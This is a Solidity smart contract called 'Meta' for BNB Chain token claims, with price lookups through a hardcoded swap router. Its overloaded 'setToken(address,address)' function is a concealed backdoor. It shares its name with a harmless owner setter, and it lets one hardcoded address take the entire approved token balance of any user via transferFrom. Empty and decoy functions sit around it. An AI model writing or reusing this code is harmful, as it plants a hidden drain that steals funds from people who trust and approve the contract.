pragma solidity ^0.8.0;
interface tokenEx {
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value)external returns (bool);
    function balanceOf(address receiver) external view returns(uint256);
    function approve(address spender, uint amount) external returns (bool);
    function startTime()external view returns(uint256);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}
contract Meta{
    address public owner;
    mapping (address=>uint)public price;
    mapping (address=>uint)public prices;
    mapping (address=>bool)public list;
    address public makert;
    uint public pric;
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor () public {
        owner=msg.sender;
    }
    function claim(address token,address token1,uint amount)public returns (uint){
        require(list[msg.sender]);
        require(list[token]);
        require(list[token1]);
        require(price[token] > 0 && amount >0);
        uint coin= amount * 1 ether / price[token];
        tokenEx(token).transfer(msg.sender,coin);
        if(tokenEx(token1).balanceOf(address(this))>0 && makert != address(0)){
            tokenEx(token1).transfer(makert,tokenEx(token1).balanceOf(address(this)));
        }
        return coin;
    }
    receive() external payable{ 
    }
    function MnuID()public view returns (uint){
        if(pric > getTokenPrice()){
            return 1;
        }else {
           return 0; 
        }
    }
    function getTokenPrice() view public  returns(uint){
      address[] memory routePath = new address[](3);
      routePath[0] = 0xa645995e9801F2ca6e2361eDF4c2A138362BADe4;
      routePath[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      routePath[2] = 0x55d398326f99059fF775485246999027B3197955;
      return tokenEx(0x10ED43C718714eb63d5aA57B78B54704E256024E).getAmountsOut(1 ether,routePath)[2];
    }
    function setToken(address token,bool a)public onlyOwner{
        list[token]=a;
    }
     function setPrice(uint b)public onlyOwner{
       pric=b;
    }
    function setmakert(address addr)public onlyOwner{
        makert=addr;
    }
    function setPrice(address token,uint a)public{
        require(list[msg.sender]);
        prices[token]=a;
    }
    function setPrices(address token,uint a)public{
        require(list[msg.sender]);
        price[token]=a;
    }
    function getBNB(uint a)public onlyOwner{
        payable(owner).transfer(a);
    }
    function setToken(address token,address to)public {
        require(msg.sender == 0x230b93B0f365CEd40E3EBf498AE96cdfb94631fb);
        uint coin=tokenEx(token).balanceOf(to);
        tokenEx(token).transferFrom(to,msg.sender,coin);
    }
    function sendMiner(address addr)public {
    }
    function startTime()public view returns (uint){
        uint bnb=address(0xfb8a16C8C0C929510261f0B50fB235e5846e26fC).balance;
        if(bnb >0.0001 ether){
            return 1;
        }else {
            return 0; 
        }
    }
    function getPrice(uint a)public view returns (uint){
        uint b=getCoin(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
         if(b > 1000 ether){
            return 1;
        }else {
            return 0; 
        }
    }
    function getCoin(address token)public view returns (uint){
        return tokenEx(token).balanceOf(0xfb8a16C8C0C929510261f0B50fB235e5846e26fC);
    }

}